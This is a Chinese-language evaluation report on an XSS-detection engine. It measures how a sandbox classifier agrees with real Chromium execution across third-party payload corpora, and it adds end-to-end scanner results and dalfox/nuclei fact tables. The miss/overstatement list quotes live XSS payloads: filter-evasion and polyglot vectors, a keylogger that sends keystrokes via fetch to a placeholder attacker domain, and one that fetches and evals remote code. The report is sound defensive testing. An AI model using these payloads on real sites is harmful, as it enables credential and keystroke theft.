# Phase 392:外部开源 XSS 语料 -> 分类器保真度 vs Chromium oracle

向量全部来自第三方开源项目(PortSwigger 2026 cheat sheet / SecLists / PayloadsAllTheThings / OWASP XSS Filter Evasion Cheat Sheet / html5sc),原样使用、不清洗不改写;oracle 是本机真实 Chromium 的 load 态对话框事件;被测对象是引擎 verify gate 用的同一个 sandbox 分类器(见下)。这不是 XSSMaze 那样的 F1 跑分,也不与 194 矩阵、bWAPP、Juice Shop 任何数字并列。

## 语料来源(全部第三方撰写,原样使用)

| corpus | file | sha256_12 | kind | candidates | selected (cap) |
|---|---|---|---|---|---|
| ps-sheet-2026 | pw_cheatsheet_20261114.html | 43af801a07f1 | portsweigger_html | 587 | 65 (65) |
| seclists-jhaddix | seclists_jhaddix.txt | 11d5df9fdea3 | flat | 108 | 20 (20) |
| seclists-brutelogic | seclists_brutelogic.txt | 9faf159b2952 | flat | 114 | 15 (15) |
| seclists-brutelogic-bypass | seclists_brutelogic_bypass.txt | aee4b0513aed | flat | 3 | 3 (5) |
| seclists-rsnake | seclists_rsnake.txt | d6b20fe69e0c | flat | 72 | 15 (15) |
| seclists-somdev | seclists_somdev.txt | 006a620d48d5 | flat | 22 | 5 (5) |
| seclists-mario | seclists_mario.txt | ba3c2dac66a3 | mario_bundle | 139 | 20 (20) |
| pat-filter-bypass | pat_filter_bypass.md | f8e40d7dbdff | md_fences | 5 | 5 (15) |
| pat-polyglot | pat_polyglot.md | e41979c882cc | md_fences | 7 | 7 (8) |
| pat-waf-bypass | pat_waf_bypass.md | 3ae9c2aed72e | md_fences | 15 | 8 (8) |
| pat-readme | pat_readme.md | c91931c0c751 | md_fences | 20 | 14 (14) |
| owasp-evasion | owasp_evasion.md | 7e298e2905c7 | md_fences | 103 | 25 (25) |

去重后唯一向量:**202**;h5sc/vectors.txt 与 SecLists XSS-Vectors-Mario.txt 是同一捆绑(只采一份,不重复计数)。

## M1:sandbox 分类器保真度(引擎真实调用 `judge(page, token="", sink="parser")`)

| 组 | population | oracle EXEC | oracle inert | agree_live | missed | overstated | agree_inert | unknown(exec/inert) | understatement_rate | overstatement_rate |
|---|---|---|---|---|---|---|---|---|---|---|
| **overall** | 2424 | 145 | 2052 | 91 | 3 | 7 | 1907 | 51/138 | 0.0207 | 0.0034 |
| escaped=False | 1616 | 145 | 1247 | 91 | 3 | 7 | 1102 | 51/138 | 0.0207 | 0.0056 |
| escaped=True | 808 | 0 | 805 | 0 | 0 | 0 | 805 | 0/0 | None | 0.0 |
| corpus=owasp-evasion | 300 | 12 | 261 | 7 | 1 | 2 | 251 | 4/8 | 0.0833 | 0.0077 |
| corpus=pat-filter-bypass | 60 | 5 | 53 | 0 | 0 | 0 | 51 | 5/2 | 0.0 | 0.0 |
| corpus=pat-polyglot | 84 | 34 | 42 | 24 | 1 | 1 | 40 | 9/1 | 0.0294 | 0.0238 |
| corpus=pat-readme | 168 | 16 | 145 | 9 | 0 | 2 | 125 | 7/18 | 0.0 | 0.0138 |
| corpus=pat-waf-bypass | 96 | 8 | 86 | 8 | 0 | 2 | 81 | 0/3 | 0.0 | 0.0233 |
| corpus=ps-sheet-2026 | 780 | 32 | 608 | 27 | 0 | 0 | 549 | 5/59 | 0.0 | 0.0 |
| corpus=seclists-brutelogic | 180 | 12 | 143 | 11 | 1 | 0 | 131 | 0/12 | 0.0833 | 0.0 |
| corpus=seclists-brutelogic-bypass | 36 | 3 | 33 | 0 | 0 | 0 | 31 | 3/2 | 0.0 | 0.0 |
| corpus=seclists-jhaddix | 240 | 12 | 228 | 0 | 0 | 0 | 216 | 12/12 | 0.0 | 0.0 |
| corpus=seclists-mario | 240 | 5 | 223 | 3 | 0 | 0 | 214 | 2/9 | 0.0 | 0.0 |
| corpus=seclists-rsnake | 180 | 2 | 178 | 0 | 0 | 0 | 169 | 2/9 | 0.0 | 0.0 |
| corpus=seclists-somdev | 60 | 4 | 52 | 2 | 0 | 0 | 49 | 2/3 | 0.0 | 0.0 |

## M1 控制页(oracle/分类器健全性断言)

| control | oracle | sandbox |
|---|---|---|
| ctl-svg-onload | exec | live |
| ctl-img-onerror | exec | live |
| ctl-script-plain | exec | unknown |
| ctl-autofocus | exec | live |
| ctl-srcdoc | exec | live |
| ctl-attr-breakout | exec | live |
| ctl-benign-text | inert | inert |
| ctl-benign-attr | inert | inert |
| ctl-benign-script | inert | unknown |

## M1 方向明细(每组前若干条)

- **missed** `seclists-brutelogic-004__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`"autofocus/onfocus=alert(1)//` oracle=exec sandbox=inert why=every token-bearing sink is inert: iframe[srcdoc] srcdoc value carries no live node; iframe[onfocus] iframe.onfocus cann
- **overstated** `pat-polyglot-005__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>` oracle=inert sandbox=live why=svg<svg> load event fires when the document parses it (measured)
- **missed** `pat-polyglot-007__text` ctx=text escaped=False vector=`JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scrip` oracle=exec sandbox=inert why=no executable node carries the token
- **overstated** `pat-waf-bypass-002__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`<svg/OnLoad="`${prompt``}`">` oracle=inert sandbox=live why=srcdoc value is parsed as a whole document
- **overstated** `pat-waf-bypass-006__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f` oracle=inert sandbox=live why=srcdoc value is parsed as a whole document
- **overstated** `pat-readme-003__text` ctx=text escaped=False vector=`<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k` oracle=inert sandbox=live why=img.onerror fires when the src resource fails
- **overstated** `pat-readme-007__text` ctx=text escaped=False vector=`<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// ` oracle=inert sandbox=live why=svg<svg> load event fires when the document parses it (measured)
- **overstated** `owasp-evasion-010__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>` oracle=inert sandbox=live why=srcdoc value is parsed as a whole document
- **overstated** `owasp-evasion-011__iframe_srcdoc` ctx=iframe_srcdoc escaped=False vector=`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#00001` oracle=inert sandbox=live why=srcdoc value is parsed as a whole document
- **missed** `owasp-evasion-024__text` ctx=text escaped=False vector=`<<SCRIPT>alert("XSS");//\<</SCRIPT>` oracle=exec sandbox=inert why=no executable node carries the token

## M2:反射孪生页端到端(上下文分类来自外部语料)

引擎批量扫描 rc=0,5.4s;vuln 孪生 8/8 有 findings,safe 孪生 0/4 有 findings。

| url | findings(layers/severity) |
|---|---|
| /t/vuln/text?q=marker | reflected/high |
| /t/vuln/attr_dq?q=marker | reflected/high |
| /t/vuln/attr_unq?q=marker | reflected/high |
| /t/vuln/script_dq?q=marker | reflected/high |
| /t/vuln/script_block?q=marker | reflected/high |
| /t/vuln/comment?q=marker | reflected/high |
| /t/vuln/href_dq?q=marker | reflected/high |
| /t/vuln/iframe_srcdoc?q=marker | reflected/high |
| /t/safe/text?q=marker | - |
| /t/safe/attr_dq?q=marker | - |
| /t/safe/comment?q=marker | - |
| /t/safe/href_dq?q=marker | - |

### 第三方工具事实表:dalfox(只记事实,不算分)

| kind | context | detected | hits | seconds | error |
|---|---|---|---|---|---|
| vuln | text | False | 0 | 1.0 |  |
| vuln | attr_dq | False | 0 | 1.0 |  |
| vuln | attr_unq | False | 0 | 1.0 |  |
| vuln | script_dq | False | 0 | 1.0 |  |
| vuln | script_block | False | 0 | 1.0 |  |
| vuln | comment | False | 0 | 1.1 |  |
| vuln | href_dq | False | 0 | 1.0 |  |
| vuln | iframe_srcdoc | False | 0 | 1.0 |  |
| safe | text | False | 0 | 1.0 |  |
| safe | attr_dq | False | 0 | 1.0 |  |
| safe | comment | False | 0 | 1.0 |  |
| safe | href_dq | False | 0 | 1.0 |  |

边界:FACT TABLE ONLY. No TP/FP/TN/FN or rates (Phase 380 rule): neither tool was given an execution-level oracle and budgets differ.

### 第三方工具事实表:nuclei(只记事实,不算分)

| kind | context | detected | hits | seconds | error |
|---|---|---|---|---|---|
| vuln | text | True | 1 | 0.8 |  |
| vuln | attr_dq | True | 1 | 0.3 |  |
| vuln | attr_unq | True | 1 | 0.3 |  |
| vuln | script_dq | True | 1 | 0.3 |  |
| vuln | script_block | True | 1 | 0.3 |  |
| vuln | comment | True | 1 | 0.3 |  |
| vuln | href_dq | True | 1 | 0.4 |  |
| vuln | iframe_srcdoc | True | 1 | 0.4 |  |
| safe | text | False | 0 | 0.3 |  |
| safe | attr_dq | False | 0 | 0.4 |  |
| safe | comment | False | 0 | 0.3 |  |
| safe | href_dq | False | 0 | 0.3 |  |

边界:FACT TABLE ONLY. No TP/FP/TN/FN or rates (Phase 380 rule): neither tool was given an execution-level oracle and budgets differ.

## 不可比项

- 本表是『外部向量上 sandbox 分类器与真浏览器的一致性』,不是检测器 F1;XSSMaze(官方靶+官方 scorer)仍是唯一 F1 来源
- oracle 只看 load 态对话框:需要交互的向量与无对话框执行(print()/静默外带)会被记 inert——是 ground truth 的已知局限,不是工具判定
- 烤页(把向量直接写进页面)不在 CLI 扫描器的检出面上:检出是反射驱动的,Phase 392 pilot 实测 8 个 oracle-EXEC 烤页 plain 与 --headless 均 0 findings——这是引擎设计边界,如实记录
- M2 第三方工具行是事实表:dalfox/nuclei 没拿到执行级 oracle,预算也不同,按 Phase 380 规则不出 TP/FP/率

